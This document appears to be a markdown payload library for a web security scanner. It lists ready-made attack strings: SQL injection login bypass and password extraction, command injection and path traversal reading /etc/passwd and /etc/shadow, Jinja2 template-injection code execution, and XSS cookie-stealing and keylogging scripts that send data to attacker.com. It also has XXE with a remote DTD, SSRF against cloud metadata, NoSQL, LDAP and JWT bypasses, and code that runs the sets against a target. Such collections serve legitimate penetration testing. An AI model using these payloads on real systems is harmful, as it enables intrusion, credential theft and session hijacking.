# Payload Library

Organized payload sets for common vulnerability classes. Use with the security testing engine.

## SQL Injection

### Detection Payloads
```python
SQLI_DETECT = {
    "single_quote": "'",
    "double_quote": '"',
    "backslash": "\\",
    "semicolon": ";",
    "comment": "/*",
    "paren_open": "(",
    "paren_close": ")",
}
```

### Auth Bypass Payloads
```python
SQLI_AUTH = {
    "or_true": "' OR 1=1--",
    "or_true_alt": "' OR '1'='1",
    "admin_comment": "admin'--",
    "admin_hash": "admin'#",
    "or_empty": "' OR ''='",
    "true_eq_true": "' OR 1=1#",
    "null_or": "' OR NULL IS NULL--",
}
```

### UNION-based Extraction (SQLite)
```python
SQLI_UNION_SQLITE = {
    "union_select_1": "' UNION SELECT 1--",
    "union_select_null": "' UNION SELECT NULL--",
    "union_select_version": "' UNION SELECT sqlite_version()--",
    "union_tables": "' UNION SELECT tbl_name,2,3 FROM sqlite_master WHERE type='table'--",
    "union_columns": "' UNION SELECT sql,2,3 FROM sqlite_master--",
    "union_users": "' UNION SELECT username,password,3 FROM users--",
}
```

### UNION-based Extraction (MySQL)
```python
SQLI_UNION_MYSQL = {
    "union_version": "' UNION SELECT version(),2,3--",
    "union_database": "' UNION SELECT database(),2,3--",
    "union_tables": "' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--",
    "union_columns": "' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--",
    "union_data": "' UNION SELECT username,password,3 FROM users--",
}
```

### Blind SQLi (Time-based)
```python
SQLI_BLIND = {
    "sleep_mysql": "' OR SLEEP(5)--",
    "sleep_pg": "' OR (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--",
    "benchmark": "' OR BENCHMARK(5000000,SHA1('test'))--",
    "waitfor": "' WAITFOR DELAY '00:00:05'--",
}
```

## Command Injection

### Basic Payloads
```python
CMDI_BASIC = {
    "semicolon_id": "; id",
    "pipe_id": "| id",
    "and_id": "&& id",
    "backtick_id": "`id`",
    "dollar_id": "$(id)",
    "newline_id": "%0aid",
}
```

### Filter Bypass
```python
CMDI_BYPASS = {
    "spaces_ifs": "cat${IFS}/etc/passwd",
    "spaces_brace": "{cat,/etc/passwd}",
    "spaces_redirect": "<cat</etc/passwd",
    "keyword_split": "c''at /etc/passwd",
    "keyword_escape": "c\\at /etc/passwd",
    "wildcard": "/???/??t /???/p??s??",
}
```

## SSTI

### Engine Detection
```python
SSTI_DETECT = {
    "jinja2": "{{7*7}}",
    "freemarker": "${7*7}",
    "thymeleaf": "#{7*7}",
    "erb": "<%= 7*7 %>",
    "angular": "${{7*7}}",
    "tornado": "{{7*7}}",
}
```

### Exploitation (Jinja2)
```python
SSTI_EXPLOIT = {
    "config": "{{config}}",
    "self": "{{self}}",
    "rce_os": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "rce_subprocess": "{{self.__init__.__globals__.__builtins__.__import__('subprocess').check_output('id').decode()}}",
    "rce_shorter": "{{''.__class__.__mro__[1].__subclasses__()}}",
    "rce_mro": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
}
```

## Path Traversal

### Basic Payloads
```python
PATH_TRAVERSAL = {
    "passwd_1": "../../../etc/passwd",
    "passwd_2": "..\\..\\..\\windows\\win.ini",
    "passwd_3": "../../../../../../etc/passwd",
    "shadow": "../../../../../../etc/shadow",
    "hosts": "../../../../../../etc/hosts",
    "proc_self": "/proc/self/environ",
    "apache_conf": "../../../../../../etc/apache2/apache2.conf",
}
```

### Filter Bypass
```python
PATH_BYPASS = {
    "double_encode": "..%252f..%252f..%252fetc/passwd",
    "unicode": "..%c0%af..%c0%af..%c0%afetc/passwd",
    "null_byte": "../../../etc/passwd%00",
    "mixed_slash": "..\\../..\\../..\\../etc/passwd",
    "absolute": "/etc/passwd",
    "protocol": "file:///etc/passwd",
}
```

## XSS

### Basic Payloads
```python
XSS_BASIC = {
    "script_alert": "<script>alert(1)</script>",
    "svg_onload": "<svg onload=alert(1)>",
    "img_onerror": "<img src=x onerror=alert(1)>",
    "details_toggle": "<details open ontoggle=alert(1)>",
    "body_onload": "<body onload=alert(1)>",
    "iframe_src": "<iframe src=javascript:alert(1)>",
}
```

### Filter Bypass
```python
XSS_BYPASS = {
    "script_nesting": "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "case_variant": "<ScRiPt>alert(1)</ScRiPt>",
    "event_handler": "<div onmouseover=alert(1)>hover</div>",
    "javascript_uri": "javascript:alert(1)",
    "data_uri": "data:text/html,<script>alert(1)</script>",
    "unicode_escape": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
}
```

### Exfiltration
```python
XSS_EXFIL = {
    "cookie_exfil": "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
    "dom_dump": "<script>document.body.innerHTML+='<pre>'+JSON.stringify(window)+\"</pre>\"</script>",
    "keylogger": "<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>",
}
```

## SSRF

### Basic Payloads
```python
SSRF_BASIC = {
    "localhost": "http://127.0.0.1",
    "localhost_alt": "http://localhost",
    "ipv6_loopback": "http://[::1]",
    "metadata_aws": "http://169.254.169.254/latest/meta-data/",
    "metadata_gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "metadata_alibaba": "http://100.100.100.200/latest/meta-data/",
}
```

### Filter Bypass
```python
SSRF_BYPASS = {
    "octal": "http://0177.0.0.1",
    "decimal": "http://2130706433",
    "hex": "http://0x7f000001",
    "ipv6_mapped": "http://[::ffff:127.0.0.1]",
    "truncated": "http://127.1",
    "redirect": "http://attacker.com/redirect_to_localhost",
    "dns_rebind": "http://attacker-rebind.example",
}
```

## NoSQL Injection

### Auth Bypass
```python
NOSQLI_AUTH = {
    "ne_null": {"$ne": None},
    "ne_empty": {"$ne": ""},
    "gt_empty": {"$gt": ""},
    "regex_all": {"$regex": ".*"},
    "where_true": {"$where": "function(){return true;}"},
}
```

## LDAP Injection

### Auth Bypass
```python
LDAP_AUTH = {
    "wildcard_both": {"username": "*", "password": "*"},
    "wildcard_user": {"username": "*", "password": "x"},
    "or_true": {"username": "*)(uid=*))(|(uid=*", "password": "x"},
    "null_byte": {"username": "\x00", "password": "\x00"},
}
```

## XXE

### Basic Payloads
```python
XXE_BASIC = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root></root>',
]
```

## JWT Attacks

### Payloads
```python
JWT_ATTACKS = {
    "alg_none": {"alg": "none", "typ": "JWT"},
    "alg_hs256": {"alg": "HS256", "typ": "JWT"},
    "role_admin": {"role": "admin", "is_admin": True},
    "user_1": {"user_id": 1, "sub": "admin"},
    "expired_override": {"exp": 9999999999},
}
```

## Race Conditions

### Testing Strategy
```python
RACE_TEST = {
    "method": "concurrent",
    "workers": 50,
    "endpoint": "/redeem",
    "data": {"code": "COUPON", "user": "attacker"},
    "success_indicator": "balance increase",
}
```

## Usage with Security Engine

```python
exec(open(".../security_engine.py").read())
from security_engine import SecurityScanner

scanner = SecurityScanner("http://target/")

# Test SQLi on login form
baseline = scanner.get_baseline("POST", "http://target/login", data={"username": "test"})
results = scanner.run_payload_set(baseline, "POST", "http://target/login", SQLI_AUTH, "username")

# Test SSTI on template endpoint
baseline = scanner.get_baseline("POST", "http://target/render", data={"name": "World"})
results = scanner.run_payload_set(baseline, "POST", "http://target/render", SSTI_EXPLOIT, "name")

# Get summary
print(scanner.get_summary())
```
